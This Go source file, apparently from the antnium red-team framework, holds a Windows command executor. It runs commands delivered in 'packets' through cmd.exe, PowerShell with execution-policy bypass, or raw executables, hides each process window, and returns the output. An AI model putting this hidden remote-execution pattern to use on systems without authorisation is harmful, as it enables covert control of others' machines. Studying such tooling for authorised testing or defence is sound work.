package executor

import (
	"context"
	"fmt"
	"os/exec"
	"syscall"
	"time"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
	"golang.org/x/text/encoding/charmap"
)

func windowsToString(data []byte) string {
	d := charmap.CodePage850.NewDecoder()
	outDecoded, err := d.Bytes(data)
	if err != nil {
		// Fall back to stdout if decoding failed
		return string(data)
	} else {
		return string(outDecoded)
	}
}

func MyExec(packetArgument model.PacketArgument) ([]byte, []byte, int, int, error) {
	stdOut := make([]byte, 0)
	stdErr := make([]byte, 0)
	pid := 0
	exitCode := 0
	var err error
	err = nil

	processTimeout := 10 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
	defer cancel()

	shellType, ok := packetArgument["shelltype"]
	if !ok {
		return stdOut, stdErr, pid, exitCode, fmt.Errorf("No argument 'shelltype' given")
	}

	var cmd *exec.Cmd
	if shellType == "cmd" {
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("No argument 'commandline' given")
		}
		cmd = exec.CommandContext(ctx, "cmd.exe")
		cmd.SysProcAttr = getSysProcAttrs()
		cmd.SysProcAttr.CmdLine = fmt.Sprintf(`cmd.exe /S /C "%s"`, commandStr)
	} else if shellType == "powershell" {
		commandStr, ok := packetArgument["commandline"]
		if !ok {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("No argument 'commandline' given")
		}

		cmd = exec.CommandContext(ctx, "powershell.exe", "-ExecutionPolicy", "Bypass", "-C", commandStr)
		cmd.SysProcAttr = getSysProcAttrs()
	} else { // "raw"
		executable, args, err := model.MakePacketArgumentFrom(packetArgument)
		if err != nil {
			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Invalid packet arguments")
		}

		cmd = exec.CommandContext(ctx, executable, args...)
		cmd.SysProcAttr = getSysProcAttrs()
	}

	stdOut, err = cmd.Output()
	if err != nil {
		if exitError, ok := err.(*exec.ExitError); ok {
			log.Infof("Case A: %s", err.Error())
			stdErr = exitError.Stderr
			pid = exitError.Pid()
			exitCode = exitError.ProcessState.ExitCode()
		} else {
			log.Infof("Case B: %s", err.Error())
			pid = 0
			exitCode = cmd.ProcessState.ExitCode()

		}
	} else {
		log.Infof("Case C")
		pid = cmd.ProcessState.Pid()
		exitCode = cmd.ProcessState.ExitCode()
	}
	return stdOut, stdErr, pid, exitCode, err
}

func getSysProcAttrs() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow: true,
	}
}
